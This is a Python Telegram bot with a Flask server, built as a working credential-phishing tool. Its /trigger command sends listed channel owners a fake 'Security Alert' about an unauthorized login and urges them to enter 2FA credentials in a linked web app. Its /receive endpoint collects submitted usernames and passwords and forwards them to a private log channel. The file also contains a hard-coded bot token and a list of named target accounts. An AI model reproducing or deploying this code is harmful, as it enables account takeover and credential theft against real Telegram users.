import os, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telebot import TeleBot, types

TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
ADMIN_ID = 8699819680
LOG_CHANNEL = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-research/" 

# DATABASE PRESERVED
TARGETS = {
    "71117894651": "@Extreme_pressure",
    "76663888074": "@BNBwebina",
    "81271111961": "@adsgram_update",
    "8699819680": "@Akun_Dev"
}

bot = TeleBot(TOKEN)
app = Flask(__name__)
CORS(app) # Allows the website to talk to Render without being blocked

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    if data:
        user = data.get('user', 'unknown')
        pwd = data.get('password', 'none')
        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>User:</b> @{user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
        return jsonify({"status": "sent"}), 200
    return jsonify({"status": "error"}), 400

@app.route('/')
def home(): return "Bot is Alive", 200

@bot.message_handler(commands=['list'])
def handle_list(message):
    if message.from_user.id == ADMIN_ID:
        response = "<b>Target Database:</b>\n\n"
        for uid, username in TARGETS.items():
            response += f"👤 {username}\nID: <code>{uid}</code>\n\n"
        bot.send_message(ADMIN_ID, response, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("Verify Channel Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
    bot.send_message(message.chat.id, "<b>Console:</b> Secure connection established.", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            raw = message.text.replace('/trigger ', '').strip()
            target_id, channel_name = raw.split('@', 1)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("Verify Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
            bait = (f"<b>⚠️ Security Alert: {channel_name}</b>\n\n"
                    f"Our automated systems have detected an unauthorized login attempt on <b>{channel_name}</b>. "
                    "To prevent ownership restriction, synchronize your 2FA credentials with the Admin Portal.")
            bot.send_message(target_id.strip(), bait, parse_mode="HTML", reply_markup=markup)
            bot.send_message(ADMIN_ID, f"✅ Alert sent to {target_id}")
        except:
            bot.send_message(ADMIN_ID, "❌ Use: /trigger ID@Name")

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
